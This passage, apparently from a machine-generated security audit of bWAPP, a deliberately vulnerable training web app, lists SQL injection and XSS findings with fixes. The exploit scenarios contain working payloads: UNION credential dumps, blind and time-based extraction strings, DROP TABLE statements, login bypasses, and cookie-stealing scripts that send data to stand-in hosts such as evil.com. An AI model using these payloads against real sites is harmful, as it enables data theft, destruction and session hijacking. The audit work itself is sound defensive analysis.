The return value is then directly concatenated into a SQL query string: `$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";` (line 131). This string is passed to `$db->query($sql)` (line 133), executing it against a SQLite database via PDO. An attacker controls the `title` GET parameter and can inject arbitrary SQL to read, modify, or delete data from the SQLite database.
findings.exploit_scenario: An attacker sends a GET request to sqli_11.php with the security_level cookie set to "0" and the query parameter: `?title=' UNION SELECT 1,sql,3,4,5 FROM sqlite_master--`. This causes the constructed SQL to become `SELECT * FROM movies WHERE title LIKE '%' UNION SELECT 1,sql,3,4,5 FROM sqlite_master--%'`, leaking the full database schema including table definitions. Further UNION-based injection can extract all data from any table in the SQLite database.
findings.recommendation: Use PDO prepared statements with parameterized queries instead of string concatenation. Replace the dynamic query with: `$stmt = $db->prepare("SELECT * FROM movies WHERE title LIKE :title"); $stmt->execute([':title' => '%' . $title . '%']);`

findings.title: Reflected XSS via unsanitized database output rendered in HTML
findings.description: Query results from the SQLite database are echoed directly into HTML without HTML-encoding on lines 146-150. In particular, `echo $row["title"]` (line 146), `echo $row["main_character"]` (line 148), `echo $row["genre"]` (line 149) output database values directly into table cells. Since the attacker can control SQL results via the SQL injection in F-11-01 (e.g., via UNION SELECT), they can inject arbitrary HTML/JavaScript that will execute in the victim's browser. Even without SQL injection, if the database contains attacker-stored content, it would render as HTML.
findings.exploit_scenario: An attacker crafts a URL such as `?title=' UNION SELECT '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',2,3,4,5--` and sends it to a victim. When the victim clicks the link (with security_level cookie at 0), the injected JavaScript executes in their browser, exfiltrating their session cookie.
findings.recommendation: HTML-encode all database output before rendering: `echo htmlspecialchars($row["title"], ENT_QUOTES, "UTF-8");`. Apply the same to all other echoed fields.

findings.title: DOM-based XSS via unsanitized jQuery .after() with server-controlled JSON data
findings.description: Lines 108–116: The jQuery AJAX handler receives JSON data from `sqli_10-2.php` and inserts field values (`val.title`, `val.release_year`, `val.main_character`, `val.genre`, `val.imdb`) directly into the DOM via `.after()` without any HTML escaping or sanitization: ```javascript $("#table_yellow tr:last").after("" + val.title + "" + val.release_year + "" + val.main_character + ... ``` jQuery's `.after()` parses the string as HTML, so if any database field contains HTML/JS (e.g., `` or ``), it will execute in the victim's browser context. An attacker can exploit this by injecting malicious payloads into the database through the SQL injection vulnerability in `sqli_10-2.php` (UNION SELECT with attacker-controlled string literals), which then renders as executable HTML on this page.
findings.exploit_scenario: An attacker sends a crafted title parameter to `sqli_10-2.php` containing a UNION SELECT SQL injection that returns a row with `` in the title column. When any user views `sqli_10-1.php` and the AJAX response is rendered, the malicious JavaScript executes, stealing session cookies or performing actions as the victim.
findings.recommendation: Use jQuery's `.text()` method to set element content instead of concatenating into HTML strings, or escape HTML entities in each field before inserting via `.after()`. For example: `$("<td>").text(val.title)`.

findings.title: SQL injection via unsanitized blog entry in SQLite INSERT
findings.description: The user-controlled POST parameter `$_POST["entry"]` flows through the `sqli()` function (line ~68). When `$_COOKIE["security_level"]` is "0" or any unrecognized value, `no_check()` is applied, returning the input unchanged. The returned value is then concatenated directly into an INSERT SQL statement on line 134: `$sql = "INSERT INTO blog (id, date, entry, owner) VALUES (" . ++$id . ",'" . date('Y-m-d', time()) . "','" . $entry . "','" . $owner . "');";`. Since PDO::exec() is used (line 136), multi-statement or union-based injection is possible depending on SQLite driver configuration; at minimum, the single-quote context allows breakout and manipulation of the INSERT.
findings.exploit_scenario: An attacker sets their security_level cookie to "0", then submits a blog entry with the value `'); DROP TABLE blog; --` or `'),(100,'2024-01-01','owned','admin') -- ` to inject arbitrary SQL, modify or delete data, or insert forged records.
findings.recommendation: Use PDO prepared statements with parameterized queries: `$stmt = $db->prepare("INSERT INTO blog (id, date, entry, owner) VALUES (?, ?, ?, ?)"); $stmt->execute([$id, date('Y-m-d'), $entry, $owner]);`

findings.title: Stored XSS via unsanitized blog entry rendered in HTML
findings.description: When `$_COOKIE["security_level"]` is "0" (or any value other than "1" or "2"), the stored blog entry is output directly to the HTML response without encoding on line 208: `echo $row["entry"];`. Since the entry value is attacker-controlled (via POST) and persisted in the SQLite database, any JavaScript in the entry will execute in the browser of every user who views the blog page. This is classic stored XSS.
findings.exploit_scenario: An attacker submits a blog entry containing `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. Any authenticated user who subsequently visits the blog page will have their session cookie exfiltrated, enabling session hijacking.
findings.recommendation: Always HTML-encode output using `htmlspecialchars($row["entry"], ENT_QUOTES, 'UTF-8')` before rendering in the page, regardless of security level setting. At security level 0, no encoding is applied at all.

findings.title: Stored XSS via owner field rendered without encoding at all security levels
findings.description: The `$row["owner"]` value is echoed without any HTML encoding on line 203 at every security level (levels 0, 1, and 2). The owner value comes from `$_SESSION["login"]` (line ~121). While this value is sourced from the session rather than directly from a POST parameter in this file, if the login username is stored without sanitization (e.g., set during registration/login in another file), a malicious username containing HTML/JavaScript would be rendered unsanitized here, enabling stored XSS across all security levels.
findings.exploit_scenario: An attacker registers or logs in with a username like `<script>alert(1)</script>`, then adds a blog entry. When any user views the blog, the malicious script in the owner column executes. This bypasses all security levels since the owner column is never encoded.
findings.recommendation: Apply `htmlspecialchars($row["owner"], ENT_QUOTES, 'UTF-8')` when outputting the owner field in the HTML table.

findings.title: SQL Injection via POST movie parameter — unquoted numeric injection
findings.description: User-supplied POST parameter `movie` is assigned to `$id` (line ~131: `$id = $_POST["movie"];`), then concatenated directly into a SQL WHERE clause without quoting at line 136: `$sql.= " WHERE id = " . sqli($id);`. The `sqli()` function dispatches on `$_COOKIE["security_level"]`: at level 0 (and default) it passes through `no_check()`, providing zero sanitization. Critically, even at level 1 where `sqli_check_2()` (likely `mysql_real_escape_string`) is called, the injected value is NOT enclosed in SQL quotes, so escaping of special characters is irrelevant — an attacker can inject arbitrary SQL fragments (e.g., `1 OR 1=1`, `1 UNION SELECT ...`) without needing any quote characters. The crafted query is executed via `mysql_query()` on line 138. Error output containing `mysql_error()` on line 144 further aids exploitation by revealing database error messages.
findings.exploit_scenario: An attacker sends a POST request to `sqli_13.php` with `movie=1 UNION SELECT 1,login,password,email,secret FROM users--&action=go` and `security_level=0` (or even `1`) cookie. Because the value is concatenated unquoted into `WHERE id = ...`, the UNION injection succeeds without any quote escaping needed. The attacker extracts credentials from the users table displayed in the page response.
findings.recommendation: Use parameterized/prepared queries instead of string concatenation. Replace the entire `sqli()` dispatch and `mysql_query()` pattern with PDO or mysqli prepared statements, binding `$id` as an integer parameter. At minimum, cast `$id = intval($_POST["movie"])` before concatenation to constrain input to a numeric value.

findings.title: Blind SQL Injection in movie search via unsanitized $_REQUEST["title"] at security level 0
findings.description:
Untrusted user input enters via $_REQUEST["title"] on line ~120: `$title = $_REQUEST["title"];`. The value is passed through the `sqli()` function (lines ~21-48). At security_level "0" (the default/low setting), the `sqli()` function calls `no_check($data)` which performs no sanitization. The returned value is then concatenated directly into a SQL query string on line 126:

`$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "' COLLATE NOCASE";`

This `$db->query($sql)` call acts as the sink. Because the application only returns a boolean "movie exists / does not exist" (lines ~132-140), this is a classic blind SQL injection vector against the SQLite database. An attacker can extract arbitrary data from the SQLite database (including credentials from any users table) using boolean-based or time-based blind SQLi techniques.
findings.exploit_scenario: An attacker sends a GET request with `title=' OR 1=1--` to confirm the injection, then performs blind data extraction using payloads like `title=' OR (SELECT substr(sql,1,1) FROM sqlite_master LIMIT 1)='C'--` to enumerate schema and extract sensitive data character by character, observing whether the response says "exists" or "does not exist".
findings.recommendation: Use parameterized queries with PDO prepared statements instead of string concatenation. Replace line 126 with: `$stmt = $db->prepare("SELECT * FROM movies WHERE title = :title COLLATE NOCASE"); $stmt->execute([':title' => $title]);`

findings.title: Stored XSS via unencoded database output in movie details
findings.description: Database column values ($title, $release_year, $main_character, $genre, $imdb) are echoed directly into HTML without htmlspecialchars() at lines 137-144. While the SQL query on line 103 uses a prepared statement (preventing direct SQL injection through $_POST["movie"]), the output of query results is not HTML-encoded. If an attacker can inject malicious content into the movies table through another bWAPP endpoint (e.g., sqli_13.php at lower security levels, or any SQLi/CRUD endpoint that modifies movie records), that content will be rendered as raw HTML here. The $imdb value on line 141 is particularly dangerous because it is embedded inside an href attribute, enabling attribute-breakout XSS (e.g., injecting `"><script>alert(1)</script>` or `" onclick="alert(1)`).
findings.exploit_scenario: An attacker uses sqli_13.php (the non-prepared-statement version available at security level 0/1) to perform a SQL INSERT or UPDATE that stores a malicious payload in the movies table — for example, setting a movie title to <script>document.location='http://evil.com/steal?c='+document.cookie</script>. When any user subsequently visits sqli_13-ps.php and selects that movie, the script executes in their browser session, stealing session cookies or performing actions as that user.
findings.recommendation: Apply output encoding with htmlspecialchars() to all database values before rendering in HTML. For example: <?php echo htmlspecialchars($title, ENT_QUOTES, 'UTF-8'); ?>. For the href attribute on line 141, also validate that $imdb matches an expected format (e.g., /^tt\d+$/) before embedding it.

findings.title: Blind time-based SQL injection via unsanitized `title` parameter at security level 0
findings.description:
The `$_REQUEST["title"]` input flows through the `sqli()` wrapper (line 46). When the `security_level` cookie is "0" (the default), `no_check()` is called (line 34), which returns the data unchanged. The unsanitized value is concatenated directly into the SQL query on line 53:

```php
$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
```

This query is executed via `mysql_query()` on line 55. The application does not echo query results to the page (they are emailed), making this a blind/time-based SQLi vector. An attacker controls the `security_level` cookie and can set it to "0" regardless of the displayed security level.

Additionally, `$_REQUEST` accepts both GET and POST, widening the attack surface. The deprecated `mysql_query()` API is used, which does not support prepared statements.
findings.exploit_scenario:
An attacker sends a GET request such as:

```
GET /sqli_15.php?title=' OR SLEEP(5)-- -
Cookie: security_level=0
```

The resulting query becomes:
```sql
SELECT * FROM movies WHERE title = '' OR SLEEP(5)-- -'
```

The database pauses for 5 seconds, confirming injection. The attacker then extracts data character-by-character using conditional time delays, e.g.:

```
title=' OR IF(SUBSTRING(database(),1,1)='b',SLEEP(5),0)-- -
```

Because results are sent via email and not rendered in the HTTP response, the attacker relies entirely on response timing to infer data. This allows full extraction of all database contents (credentials, PII, etc.).

findings.title: SQL Injection in login form via unsanitized POST login parameter
findings.description:
The user-supplied `$_POST["login"]` value flows through the `sqli()` function (line 90), which at security_level "0" (the default) calls `no_check()` — a pass-through with no sanitization. The returned value is then directly concatenated into a SQL query string on line 101:

```php
$sql = "SELECT * FROM users WHERE login = '" . $login . "'";
```

This query is executed via `mysql_query()` on line 105. Additionally, on query failure, `mysql_error()` is dumped to the client (line 109), enabling error-based data exfiltration.

The `$password` field is also passed through `sqli()` (line 95) but subsequently hashed with SHA-1 (line 97), neutralizing injection via that parameter. The login field is the exploitable sink.
findings.exploit_scenario:
An attacker submits a login value of `' OR '1'='1' -- ` with any password. The resulting query becomes:
`SELECT * FROM users WHERE login = '' OR '1'='1' -- '`
This returns the first row from the `users` table. The SHA-1 of the attacker's chosen password is then compared (`==`) against the stored hash, so the attacker would still need to match the hash. However, a more targeted payload like `' UNION SELECT 1,'admin',SHA1('attackerpw'),'secret',... -- ` could craft a row where the password column matches the attacker's SHA-1, achieving full authentication bypass. Alternatively, error-based or UNION-based injection can extract all database contents (other users' credentials, secrets, etc.).

findings.title: Stored SQL Injection via User-Agent header in INSERT statement
findings.description:
The `$_SERVER["HTTP_USER_AGENT"]` value (line 96) is fully attacker-controlled via the HTTP request header. It flows through the `sqli()` function (lines 23–45), which dispatches to `no_check()` when the `security_level` cookie is "0" (the default). The unsanitized value is then string-concatenated directly into an INSERT query on line 97:

```php
$sql = "INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '" . sqli($user_agent) . "', '" . $ip_address . "')";
```

This is executed via `$link->query($sql)` on line 99. The injected payload is persisted in the database and later displayed to any user who visits the page (SELECT on line 109, rendered in HTML table on lines 168–176), making this a stored SQL injection.
findings.exploit_scenario:
An attacker sends an HTTP request with a crafted User-Agent header such as:

```
User-Agent: ', (SELECT password FROM users LIMIT 1), '0.0.0.0') -- 
```

This produces the SQL:
```sql
INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '', (SELECT password FROM users LIMIT 1), '0.0.0.0') -- ', '1.2.3.4')
```

The subquery result is stored in the `ip_address` column and then rendered in the HTML table (line 172: `echo $row->ip_address`) for any subsequent visitor to see, leaking sensitive database contents. Alternatively, stacked queries or `INSERT INTO ... SELECT` patterns can be used to exfiltrate arbitrary data from any table.

findings.title: SQL Injection via unsanitized GET parameter "movie" when security_level is 0
findings.description: The GET parameter `$_GET["movie"]` is assigned directly to `$id` on line 80. This value is then passed through the `sqli()` function (line 86), which concatenates it into a SQL WHERE clause: `$sql.= " WHERE id = " . sqli($id);`. When `$_COOKIE["security_level"]` equals `"0"` (or any value other than `"1"`), the `sqli()` function calls `no_check()`, which performs no sanitization or escaping. The unsanitized attacker-controlled string is concatenated directly into the SQL query and executed via `mysql_query()` on line 88. Additionally, line 95 calls `die("Error: " . mysql_error())`, which leaks detailed database error messages back to the attacker, facilitating error-based SQL injection exploitation.
findings.exploit_scenario: An attacker sends a GET request such as: `GET /sqli_2.php?movie=1+UNION+SELECT+1,2,3,4,5,6,7--&action=go` with `security_level` cookie set to `"0"`. The injected UNION clause executes, and the attacker can extract arbitrary data from the database (e.g., credentials from the users table). The verbose `mysql_error()` output further enables error-based data exfiltration.
findings.recommendation: Use prepared statements with parameterized queries (e.g., PDO or mysqli prepared statements) instead of string concatenation. Replace the deprecated `mysql_*` API entirely. At minimum, cast `$id` to an integer with `(int)` before concatenation since `id` is expected to be numeric: `$sql.= " WHERE id = " . (int)$id;`

findings.title: Stored XSS via unencoded output of database-sourced movie fields
findings.description:
Multiple locations echo database values into HTML without output encoding:

- Line 142: `<?php echo $row->id;?>` inside an attribute (from `select * from movies`)
- Line 143: `<?php echo $row->title; ?>` inside element content
- Lines 167–170: `<?php echo $title ?>`, `$release_year`, `$main_character`, `$genre` from the prepared-statement result
- Line 170: `<?php echo $imdb ?>` injected directly into an `href` attribute value — attacker-controlled data breaks out of the URL into arbitrary attributes.

An attacker who can insert or modify rows in the `movies` table (e.g., via a separate SQL injection endpoint such as the non-prepared-statement `sqli_2.php`) can store HTML/JS payloads in any of these columns. When any user subsequently visits `sqli_2-ps.php`, the payload renders and executes in their browser context.

Root cause: no `htmlspecialchars()` (or equivalent) on any echoed database value.
findings.exploit_scenario: An attacker uses the low-security `sqli_2.php` endpoint (or another write-capable SQLi) to INSERT a movie row with `main_character = '<script>document.location="https://evil.test/c?"+document.cookie</script>'`. When an admin visits `sqli_2-ps.php` and selects that movie, the script executes, exfiltrating the session cookie.
findings.recommendation: Apply `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` to every variable echoed into HTML. For the `href` on line 170, additionally validate that `$imdb` matches the expected `tt[0-9]+` pattern before embedding it in a URL.

findings.title: Attribute-injection / link-manipulation via unencoded $imdb in href
findings.description: Line 170: `<a href="http://www.imdb.com/title/<?php echo $imdb ?>" target="_blank">`. The `$imdb` column value is interpolated directly into an `href` attribute without encoding. A stored payload such as `" onclick="alert(1)` breaks out of the attribute; alternatively `" accesskey="x` or a scheme like `" style="...` could be injected. If the attacker controls the `imdb` field in the database, this is a stored XSS vector even without a `<script>` tag (attribute-based event handler injection).
findings.exploit_scenario: Attacker stores a movie with `imdb = 'tt0000001" onmouseover="alert(document.cookie)'`. When the row is rendered, the resulting anchor becomes `<a href="http://www.imdb.com/title/tt0000001" onmouseover="alert(document.cookie)" target="_blank">`, executing JS on mouse-over.
findings.recommendation: Use `htmlspecialchars($imdb, ENT_QUOTES, 'UTF-8')` inside the attribute, and validate the format matches `^tt\d+$` before rendering.

findings.title: SQL injection in login form via unsanitized POST parameters
findings.description: The `login` and `password` POST parameters (lines 100–104) are passed through `sqli()` which dispatches on the user-controlled `security_level` cookie. At security level "0" (the default), `no_check()` is applied, performing zero sanitization. The raw values are then string-concatenated directly into a SQL query on line 109: `$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'"`. This query is executed via `mysql_query()` on line 112. Because the attacker fully controls both `login` and `password` and can also set the `security_level` cookie to "0", there is no effective defense against injection.
findings.exploit_scenario: An attacker sends a POST request with `login` set to `admin' -- ` and `password` set to anything. The resulting query becomes `SELECT * FROM heroes WHERE login = 'admin' -- ' AND password = '...'`, commenting out the password check and authenticating as any hero. The attacker then sees the hero's secret (line 124). More advanced payloads (e.g., UNION SELECT) could exfiltrate arbitrary database contents. The SQL error returned by `die("Error: " . mysql_error())` on line 114 further aids blind/error-based exploitation.
findings.recommendation: Use parameterized queries (prepared statements) instead of string concatenation. Replace the deprecated `mysql_query` API with `mysqli` or `PDO`, and bind `login` and `password` as parameters. Remove the reliance on a user-controllable cookie for choosing the sanitization strategy.

findings.title: SQL error message leakage aids injection exploitation
findings.description: When `mysql_query()` fails (line 112), the code calls `die("Error: " . mysql_error())` on line 114, returning the full database error message to the user. This exposes table/column names and query structure, significantly simplifying error-based and blind SQL injection exploitation for the vulnerability at line 109.
findings.exploit_scenario: An attacker crafting SQL injection payloads receives detailed MySQL error messages in the HTTP response, revealing backend schema details that allow rapid progression from injection to full data exfiltration.
findings.recommendation: Replace `die("Error: " . mysql_error())` with a generic error message for the user. Log the detailed `mysql_error()` output server-side only.

findings.title: Reflected XSS via database values rendered without HTML encoding
findings.description: On line 124, the `login` and `secret` values fetched from the database are embedded directly into HTML output via `$message` without `htmlspecialchars()` encoding: `"Welcome " . ucwords($row["login"]) . "...Your secret: " . ucwords($row["secret"]) . ""`. An attacker who can insert or modify hero records (e.g., via SQL injection on a different endpoint, or by exploiting the SQL injection in this same file to INSERT/UPDATE via stacked queries if the driver supports them) could store HTML/JavaScript payloads that execute when the record is later rendered here.
findings.exploit_scenario: An attacker uses the SQL injection (F-03-01) or another vector to insert a hero record with `login` set to `<script>alert(document.cookie)</script>`. When that hero's row is returned by the query and displayed on line 124, the JavaScript executes in the victim's browser, stealing session cookies.
findings.recommendation: Apply `htmlspecialchars()` to all database values before embedding them in HTML output: `htmlspecialchars($row["login"], ENT_QUOTES, 'UTF-8')`.

findings.title: Blind boolean-based SQL injection via unsanitized title parameter
findings.description:
Untrusted user input from `$_REQUEST["title"]` (line ~130) flows through the `sqli()` wrapper (lines 18–36) into a raw SQL string concatenation at line 134:

```php
$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
```

When the `security_level` cookie is "0" (the default/low setting), `sqli()` dispatches to `no_check($data)`, which performs no sanitization whatsoever. The concatenated SQL is then executed directly via `mysql_query()` at line 136.

The application distinguishes exactly two outcomes — "The movie exists in our database!" vs. "The movie does not exist in our database!" — making this a textbook blind boolean-based SQL injection. An attacker can extract arbitrary data from the database by crafting boolean conditions and observing which response is returned.

Even the medium-level defense (`sqli_check_1`, likely `mysql_real_escape_string`) can be bypassed in certain multi-byte character set configurations. Only the high level (`sqli_check_2`, likely `mysqli_prepare`) provides safe parameterized queries.
findings.exploit_scenario:
An attacker sends a GET request such as:

```
GET /sqli_4.php?title=' OR SUBSTRING(database(),1,1)='a'-- -
```

with `security_level=0` in their cookie. If the response says "The movie exists in our database!", the first character of the database name is confirmed as 'a'. By iterating through characters and positions, the attacker extracts the full database name, table names, column values (including credentials), etc. — all without seeing any query output directly.

findings.title: Blind SQL injection via unsanitized SOAP parameter at security level 0
findings.description: Untrusted input from `$_REQUEST["title"]` flows through the `sqli()` function (line 112). When the `security_level` cookie is "0" (the default/low setting), `no_check($data)` is applied, which performs no sanitization. The raw attacker-controlled string is then passed as the "title" argument to a SOAP call on line 133: `$client->call("get_tickets_stock", array("title" => sqli($_REQUEST["title"])))`. The backend SOAP service (`ws_soap.php`) is expected to embed this value directly into a SQL query, enabling blind SQL injection. Because the result (`$tickets_stock`) is a single scalar echoed to the page, the attacker would use boolean-based or time-based blind SQLi techniques to extract data.
findings.exploit_scenario: An attacker sets the security level cookie to "0" (or simply leaves it default) and sends: `GET /sqli_5.php?title=Movie'+AND+SLEEP(5)---. The SOAP backend receives the unsanitized payload in its SQL query, causing a time-based delay that confirms injection. The attacker then automates blind extraction of database contents (e.g., credentials from the users table) using boolean conditions like `AND (SELECT SUBSTRING(...))='c'`.
findings.recommendation: Use parameterized queries / prepared statements in the SOAP backend (`ws_soap.php`). At the application layer, apply server-side input validation (whitelist of known movie titles) regardless of security level setting, since the security level cookie is client-controlled.

findings.title: Reflected XSS via unsanitized SOAP response output
findings.description: On line 135, the SOAP response is echoed directly into the HTML page without HTML encoding: `echo "We have " . $tickets_stock . " movie tickets available in our stock.";`. If the SOAP backend reflects portions of the attacker-controlled `title` parameter in its response (e.g., in an error message or in data exfiltrated via SQL injection), an attacker can inject arbitrary HTML/JavaScript that executes in the victim's browser.
findings.exploit_scenario: An attacker crafts a SQL injection payload via the `title` parameter that causes the SOAP backend to return a string containing `<script>alert(document.cookie)</script>`. This value is assigned to `$tickets_stock` and rendered unescaped on line 135, executing JavaScript in the victim's browser session.
findings.recommendation: HTML-encode the SOAP response before output: `echo "We have " . htmlspecialchars($tickets_stock, ENT_QUOTES, "UTF-8") . " movie tickets available in our stock.";

findings.title: SQL Injection via unsanitized POST title parameter at low security level
findings.description:
The user-supplied POST parameter `title` (line ~118: `$title = $_POST["title"];`) flows into the `sqli()` function (line ~122). When the `security_level` cookie is "0" (the default/low setting), `sqli()` delegates to `no_check()` (line 24), which returns the input completely unchanged. The return value is then directly string-concatenated into a SQL query on line 122:

```php
$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
```

This query is executed via `mysql_query()` on line 124. The lack of parameterization or escaping at security level 0 allows full classical SQL injection. Additionally, `mysql_error()` is printed directly into the HTML response (line 130), providing the attacker with database error messages to facilitate blind/error-based SQLi techniques.
findings.exploit_scenario: An attacker sends a POST request to sqli_6.php with the security_level cookie set to "0" (or not set, which defaults to no_check) and the body parameter `title` set to `' UNION SELECT 1,concat(login),concat(password),4,5 FROM users--`. This terminates the LIKE clause, appends a UNION SELECT to dump all credentials from the users table, and the resulting rows are rendered directly in the HTML table.
findings.recommendation: Use parameterized queries (prepared statements) instead of string concatenation. Replace the mysql_* API (deprecated/removed in modern PHP) with PDO or mysqli prepared statements. For example: `$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE :title"); $stmt->execute([':title' => '%' . $title . '%']);`. Additionally, suppress raw database error messages from being displayed to end users.

findings.title: Stored XSS via database values rendered without HTML encoding
findings.description: On lines 138-142, values fetched from the database (`$row["title"]`, `$row["release_year"]`, `$row["main_character"]`, `$row["genre"]`) are echoed directly into the HTML without `htmlspecialchars()` or any output encoding. If an attacker can insert HTML/JavaScript content into these database fields (e.g., via SQL injection to INSERT/UPDATE, or via any other admin/input vector that stores to the movies table), that content will execute in the browser of any user viewing the search results.
findings.exploit_scenario: An attacker uses the SQL injection from F-06-01 to insert a row into the movies table with a title like `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. When any user subsequently searches for movies and the result set includes this row, the JavaScript executes in their browser, stealing session cookies.
findings.recommendation: Apply `htmlspecialchars()` to all database values before echoing them into HTML. For example: `<?php echo htmlspecialchars($row["title"], ENT_QUOTES, "UTF-8"); ?>`.

findings.title: SQL Injection via unsanitized blog entry in INSERT statement
findings.description: Untrusted user input from $_POST["entry"] (textarea form field) flows through the sqli() helper function. When the security_level cookie is "0", the function calls no_check($data), which returns the input unchanged. The returned value is then concatenated directly into an SQL INSERT statement: `"INSERT INTO blog (date, entry, owner) VALUES (now(), '" . $entry . "','" . $owner . "')"` which is executed via $link->query($sql). An attacker controls the full content of $entry with no parameterization or escaping.
findings.exploit_scenario: An attacker sets the security_level cookie to "0", then POSTs to the form with the "entry" textarea set to: `'); DROP TABLE blog; --` or `') OR 1=1 --` or any blind/union-based payload. The injected SQL is executed server-side by MySQL, allowing data exfiltration, modification, or destruction of the blog table and potentially other tables via chained queries.

findings.title: Stored XSS via raw echo of blog entry content
findings.description: When security_level is "0", the application retrieves all blog entries with `SELECT * FROM blog` and renders them to HTML. The entry content is output with `echo $row->entry;` with no HTML entity encoding. Since blog entries are stored via the INSERT above (also un-sanitized at level 0), an attacker can store arbitrary JavaScript in the database which executes in every visitor's browser when viewing the blog.
findings.exploit_scenario: An attacker posts a blog entry containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. Any user viewing the blog page will have their session cookie exfiltrated, enabling session hijacking.

findings.title: SQL injection via unsanitized XML-parsed login and secret fields in UPDATE query
findings.description:
The LOW-security branch (entered when the cookie `security_level` is not "1" or "2") reads the raw HTTP body, parses it as XML, and extracts `$login` (line 33) and `$secret` (line 34) directly from attacker-controlled XML nodes. Both values are concatenated without any sanitization into a SQL UPDATE statement on line 38:

```php
$sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'";
```

The query is executed on line 42 via `$link->query($sql)`. An attacker controls both `$login` and `$secret` entirely, enabling classic string-concatenation SQL injection.

Entry point: `file_get_contents("php://input")` → `simplexml_load_string($body)` → `$xml->login`, `$xml->secret`.
Sink: `$link->query($sql)` on line 42.
Trigger condition: The request cookie `security_level` must be absent or set to any value other than "1" or "2" (the default/LOW state).
findings.exploit_scenario:
An attacker sends a POST request with Content-Type appropriate for XML and the following body:

```xml
<root>
  <login>admin' OR '1'='1' -- </login>
  <secret>pwned</secret>
</root>
```

This produces: `UPDATE users SET secret = 'pwned' WHERE login = 'admin' OR '1'='1' -- '`, which resets the secret for every user in the database. Alternatively, injecting through `$secret` enables subqueries to extract or modify arbitrary data (e.g., `secret` value of `' ); DROP TABLE users; -- ` or `' || (SELECT password FROM users LIMIT 1) -- `).

findings.title: SQL Injection via unsanitized title parameter in movie search
findings.description: The `title` GET parameter is read at line 124 (`$title = $_GET["title"];`) and passed into the `sqli()` wrapper. When `$_COOKIE["security_level"]` is "0" (the default "low" setting), `sqli()` calls `no_check($data)` which performs no sanitization. The return value is then concatenated directly into a SQL query at line 127: `$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";`. This query is executed via `mysql_query()` at line 129. Additionally, on error, the full `mysql_error()` output is displayed to the user (line 134), enabling error-based data extraction.
findings.exploit_scenario: An attacker sends a GET request such as: `sqli_9.php?action=search&title=' UNION SELECT 1,2,3,4,5-- -`. Because `no_check()` applies no sanitization at security level 0, this produces the query: `SELECT * FROM movies WHERE title LIKE '%' UNION SELECT 1,2,3,4,5-- -%'`. The attacker can extract arbitrary database contents (users table, credentials, etc.) via UNION-based or error-based injection. The `mysql_error()` disclosure at line 134 further aids error-based extraction techniques.
findings.recommendation: Use parameterized/prepared statements instead of string concatenation to build SQL queries. Replace the `mysql_query()` call with PDO or mysqli prepared statements. At minimum, apply `mysql_real_escape_string()` inside `no_check()` and validate input type/length.

findings.title: Reflected XSS via SQL error output containing user input
findings.description: When the SQL query at line 129 fails, `mysql_error()` is echoed directly into the HTML at line 134: `die("Error: " . mysql_error());`. Because the user-controlled `title` parameter is embedded in the query unsanitized (at security level 0), the resulting MySQL error message may contain fragments of the attacker's input. If the error message includes the injected payload and is rendered without HTML encoding, this creates a reflected XSS vector.
findings.exploit_scenario: An attacker crafts a request: `sqli_9.php?action=search&title=<script>alert(document.cookie)</script>`. If the SQL error message includes the malformed input fragment, the JavaScript executes in the victim's browser when the error page is rendered, allowing session cookie theft.
findings.recommendation: Never display raw database error messages to users. Replace `die("Error: " . mysql_error())` with a generic error message and log the detailed error server-side. Also encode all output with `htmlspecialchars()` before rendering.

findings.title: Stored XSS via unencoded database output in movie table rows
findings.description: Database column values (`$row["title"]`, `$row["main_character"]`, `$row["genre"]`, `$row["imdb"]`) are echoed at lines 146–150 without `htmlspecialchars()` encoding. If an attacker can write arbitrary content into the `movies` table (e.g., via the SQL injection in F-09-01 using an INSERT/UPDATE-based second-order attack, or through any other administrative interface), any embedded HTML/JavaScript will execute in the browser of any user viewing the movie listing.
findings.exploit_scenario: An attacker uses the SQL injection from F-09-01 to insert a row into the movies table containing a `<script>` payload in the title or main_character field. Any subsequent user who searches for movies and views the listing will have the script execute in their session context.
findings.recommendation: Apply `htmlspecialchars($row["column"], ENT_QUOTES, "UTF-8")` to all database values before echoing them into HTML output.

findings.title: Stored XSS via unescaped $bug[0] in option tag
findings.description: The `$bugs` array is populated from `selections.php` (which reads `bugs.txt`). At line 132, `echo "<option value='$key'>$bug[0]</option>"` outputs `$bug[0]` directly into HTML with no encoding (e.g., `htmlspecialchars`). The `$bug[0]` value comes from `explode(",", trim($value))` where `$value` is a line from the bugs data source. If the bugs data source (e.g., `bugs.txt`) can be influenced or poisoned — for instance through a separate file-write vulnerability or a shared writable file — an attacker can inject arbitrary HTML/JavaScript that executes in the context of any authenticated user viewing the bug selection dropdown. Similarly, `$key` inside single-quoted attribute `value='$key'` is also unescaped, though integer array keys limit practical exploitation of that specific insertion point.
findings.exploit_scenario: An attacker who can write to or modify `bugs.txt` (via a separate file-write or file-upload vulnerability elsewhere in bWAPP) appends a line like `<script>alert(document.cookie)</script>,sqli_drupal.php`. When any user loads the page and the dropdown renders, the JavaScript executes, allowing session token theft.
findings.recommendation: Escape all dynamic output with `htmlspecialchars($bug[0], ENT_QUOTES, 'UTF-8')` before embedding in HTML. Apply the same to `$key` for defense-in-depth.

findings.title: Drupal SQL Injection gateway — CVE-2014-3704 (Drupageddon) referenced but sink is in Drupal codebase
